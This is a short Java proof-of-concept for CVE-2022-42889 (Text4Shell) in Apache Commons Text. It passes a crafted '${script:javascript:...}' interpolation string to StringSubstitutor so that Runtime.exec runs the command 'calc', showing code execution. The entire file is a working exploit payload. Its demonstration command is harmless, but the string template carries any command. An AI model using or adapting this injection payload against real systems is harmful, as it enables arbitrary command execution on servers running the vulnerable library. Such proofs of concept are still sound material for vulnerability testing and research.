package commons_text;

import org.apache.commons.text.StringSubstitutor;

public class CVE_2022_42889 {
    public static void main(String[] args) {
        final StringSubstitutor interpolator = StringSubstitutor.createInterpolator();
        final String text = interpolator.replace("${script:javascript:eval(java.lang.Runtime.getRuntime().exec(\"calc\"))}");
        System.out.println(text);
    }
}
